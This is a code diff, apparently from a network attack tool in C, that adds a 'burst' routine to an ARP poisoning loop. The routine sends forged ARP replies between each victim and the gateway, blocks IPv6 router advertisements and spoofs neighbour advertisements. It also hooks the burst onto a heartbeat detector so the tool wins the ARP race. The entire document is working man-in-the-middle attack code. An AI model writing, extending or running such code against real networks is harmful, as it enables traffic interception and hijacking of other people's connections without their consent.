@@ -16,6 +16,35 @@
 
 extern unsigned char *get_own_mac(void);
 
+static struct Victim *g_poison_victims = NULL;
+static int g_poison_victim_count = 0;
+static unsigned char g_poison_gateway_ip[4];
+static unsigned char g_poison_gateway_mac[6];
+static unsigned char *g_poison_gateway_ipv6_ll = NULL;
+static int g_poison_sockfd = -1;
+static unsigned char *g_poison_my_mac = NULL;
+
+// Sends a "burst" of packets to ensure we win the ARP race
+void execute_poison_burst(void) {
+  if (g_poison_sockfd == -1 || !g_poison_victims) return;
+  
+  printf("[BURST] Heartbeat detected! Sending G-ARP burst...\n");
+  for (int b = 0; b < 3; b++) { // Burst of 3
+    for (int i = 0; i < g_poison_victim_count; i++) {
+      send_arp_reply(g_poison_sockfd, g_poison_victims[i].mac, g_poison_victims[i].ip, g_poison_my_mac, g_poison_gateway_ip);
+      send_arp_reply(g_poison_sockfd, g_poison_gateway_mac, g_poison_gateway_ip, g_poison_my_mac, g_poison_victims[i].ip);
+    }
+    
+    // Also burst IPv6 if available
+    if (g_poison_gateway_ipv6_ll) {
+      send_ndp_ra_block(g_poison_sockfd, g_poison_my_mac, g_poison_gateway_ipv6_ll);
+      unsigned char all_nodes_mac[6] = {0x33, 0x33, 0x00, 0x00, 0x00, 0x01};
+      send_ndp_na_spoof(g_poison_sockfd, all_nodes_mac, g_poison_my_mac, g_poison_gateway_ipv6_ll);
+    }
+    usleep(10000); // 10ms between rounds in the burst
+  }
+}
+
 // Sends a single forged ARP reply
 int send_arp_reply(int sockfd, unsigned char *target_mac,
                    unsigned char *target_ip, unsigned char *spoofed_mac,
@@ -96,8 +125,18 @@ void start_poisoning(struct Victim *victims, int victim_count,
   }
 
   // Infinite loop sending forged packets
-  // Initialize Adaptive Rate Monitor
-  init_rate_monitor(gateway_mac, gateway_ipv6_ll);
+  // Setup global state for burst callback
+  g_poison_victims = victims;
+  g_poison_victim_count = victim_count;
+  memcpy(g_poison_gateway_ip, gateway_ip, 4);
+  memcpy(g_poison_gateway_mac, gateway_mac, 6);
+  g_poison_gateway_ipv6_ll = gateway_ipv6_ll;
+  g_poison_sockfd = sockfd;
+  g_poison_my_mac = my_mac;
+
+  // Initialize Adaptive Rate Monitor and register burst callback
+  set_burst_callback(execute_poison_burst);
+  init_rate_monitor(gateway_mac, gateway_ip, gateway_ipv6_ll);
 
   while (1) {
     for (int i = 0; i < victim_count; i++) {
